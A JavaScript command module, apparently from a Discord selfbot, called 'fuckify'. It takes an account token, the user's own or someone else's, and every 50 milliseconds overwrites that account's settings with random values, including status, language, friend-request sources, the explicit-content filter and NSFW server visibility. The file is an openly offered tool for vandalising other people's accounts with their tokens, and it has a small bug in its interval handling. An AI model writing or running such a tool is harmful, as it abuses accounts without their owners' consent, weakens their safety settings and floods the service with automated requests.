const { patchSettings } = require("../modules/settings");

module.exports.help = {
  name: "fuckify",
  description: "Fuck your account, or someone elses",
  usage:
    "!fuckify [token] (self or someone else's) [change language] (true or false)",
};

const locales = ["de", "en-US", "es-ES", "pt-BR", "ru", "zh-CN"];
const statuses = ["online", "idle", "dnd", "invisible"];

const randArray = (a) => a[Math.floor(Math.random() * a.length)];
const randBool = () => Math.random() > 0.5;
const randInt = (s = 0, e = 10) => Math.floor(Math.random() * (e - s + 1) + s);
const randStr = () => Math.random().toString(36).substring(2);

async function fuckify(token, doLang) {
  const settings = {
    convert_emoticons: randBool(),
    custom_status: { text: randStr() },
    developer_mode: randBool(),
    disable_games_tab: randBool(),
    enable_tts_command: randBool(),
    explicit_content_filter: randInt(0, 2),
    friend_source_flags: {
      all: randBool(),
      mutual_friends: randBool(),
      mutual_guilds: randBool(),
    },
    gif_auto_play: randBool(),
    inline_attachment_media: randBool(),
    inline_embed_media: randBool(),
    render_embeds: randBool(),
    render_reactions: randBool(),
    show_current_game: randBool(),
    status: randArray(statuses),
    timezone_offset: randInt(0, 300),
    view_nsfw_guilds: randBool(),
  };

  if (doLang) {
    settings.message_display_compact = randBool();
    settings.theme = randArray(["dark", "light"]);
    settings.locale = randArray(locales);
  }
  try {
    await patchSettings(settings, token);
  } catch (e) {
    console.error(e);
  }
}

module.exports.execute = function (message, args) {
  let token;
  if (args[0] && args[0] != "self") token = args[0];
  let doLang = !!args[1];
  if (module.exports.interval !== null) clearInterval(fuckify.interval);
  module.exports.interval = setInterval(fuckify, 50, token, doLang);
};

module.exports.interval = null;
